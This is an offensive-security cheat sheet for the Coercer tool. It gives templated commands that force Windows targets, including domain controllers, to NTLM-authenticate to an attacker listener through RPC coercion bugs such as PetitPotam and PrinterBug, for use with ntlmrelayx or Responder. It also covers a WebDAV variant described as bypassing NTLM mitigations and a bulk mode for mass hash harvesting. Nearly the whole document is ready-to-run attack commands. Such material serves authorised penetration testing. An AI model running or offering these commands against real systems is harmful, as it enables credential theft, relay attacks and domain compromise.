# Coercer

Coerce a target into NTLM-authenticating to a controlled listener via vulnerable RPC functions (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce, etc.). Pair with `ntlmrelayx` or `Responder` to capture or relay the resulting hash.

<!-- cheat
export coercer_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := --hashes :$credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

### scan

Trigger scan with Coercer.

Enumerate which coercion RPC functions the target responds to (no actual coercion). Read-only recon.

```sh title:"Coercer Trigger Scan"
coercer scan -d $domain -u $user $auth_flags -t $rhost_ip
```
<!-- cheat
import domain_ip
import users
import coercer_auth
-->

### coerce to listener

Trigger Coercer to listener.

Force the target to authenticate to your listener IP. Pair with `ntlmrelayx` or `Responder` on `$lhost` to catch or relay the hash.

```sh title:"Coercer Trigger to Listener"
coercer coerce -d $domain -u $user $auth_flags -t $rhost_ip -l $lhost
```
<!-- cheat
import tun_ip
import domain_ip
import users
import coercer_auth
-->

### coerce via WebDAV hostname

Trigger via WebDAV hostname with Coercer.

Use a WebDAV/UNC hostname instead of IP - forces Kerberos-style auth that survives `-RestrictNTLM` lockdowns and bypasses NTLM mitigations. Hostname must resolve to your listener (often via Responder spoofing).

```sh title:"Coercer Trigger Via WebDAV Hostname"
coercer coerce -d $domain -u $user $auth_flags -t $rhost_ip --webdav-host $listener_hostname
```
<!-- cheat
import domain_ip
import users
import coercer_auth
var listener_hostname
-->

### bulk coerce from file

Trigger bulk coerce from file with Coercer.

Coerce a list of targets from file. Useful when you want to mass-coerce all DCs/computers and harvest hashes.

```sh title:"Coercer Trigger Bulk Coerce from File"
coercer coerce -d $domain -u $user $auth_flags --targets-file $targets_file -l $lhost
```
<!-- cheat
import tun_ip
import domain_ip
import users
import coercer_auth
var targets_file
-->
